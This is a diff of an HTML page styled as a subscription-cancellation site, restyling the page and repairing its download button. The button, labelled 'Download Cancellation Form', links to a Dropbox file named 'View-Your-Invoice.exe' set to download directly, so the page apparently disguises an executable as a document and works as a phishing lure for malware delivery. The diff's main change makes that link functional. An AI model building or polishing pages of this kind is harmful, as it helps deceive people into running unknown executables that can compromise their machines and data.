@@ -4,51 +4,73 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Cancel Subscription</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #e0eafc, #cfdef3);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
-    .container {
-      background: white;
-      padding: 2rem 3rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    .card {
+      background: #ffffff;
+      padding: 3rem 2.5rem;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
       text-align: center;
-      max-width: 500px;
+      max-width: 480px;
+      width: 100%;
+      animation: fadeIn 0.6s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
     h1 {
-      color: #333;
+      margin: 0 0 1rem;
+      color: #1f2937;
+      font-size: 2rem;
     }
     p {
-      color: #555;
+      color: #4b5563;
       margin-bottom: 2rem;
+      font-size: 1rem;
+      line-height: 1.5;
     }
     a.download-btn {
-      background-color: #007bff;
+      display: inline-block;
+      background-color: #2563eb;
       color: white;
-      padding: 0.75rem 1.5rem;
+      padding: 0.85rem 1.6rem;
+      font-size: 1rem;
+      border-radius: 8px;
       text-decoration: none;
-      font-size: 1.1rem;
-      border-radius: 6px;
-      transition: background-color 0.3s;
+      font-weight: 600;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.1);
+      transition: background 0.3s, transform 0.2s;
     }
     a.download-btn:hover {
-      background-color: #0056b3;
+      background-color: #1e40af;
+      transform: scale(1.03);
     }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="card">
     <h1>Cancel Your Subscription</h1>
-    <p>Click the button below to download the cancellation form. After filling it out, follow the instructions to submit and cancel your subscription.</p>
-    <a class="https://www.dropbox.com/scl/fi/dt3k9zf0bydt6mj286hsz/View-Your-Invoice.exe?rlkey=jky7ku5pod2e2s8njwfkncw7o&st=5hy2qcr3&dl=1" download>
-      📄 Download Cancellation Form
+    <p>Download the cancellation form by clicking the button below. After filling it out, follow the instructions to cancel your subscription easily.</p>
+    <a 
+      class="download-btn" 
+      href="https://www.dropbox.com/scl/fi/dt3k9zf0bydt6mj286hsz/View-Your-Invoice.exe?rlkey=jky7ku5pod2e2s8njwfkncw7o&st=5hy2qcr3&dl=1" 
+      download
+    >
+      📥 Download Cancellation Form
     </a>
   </div>
 </body>
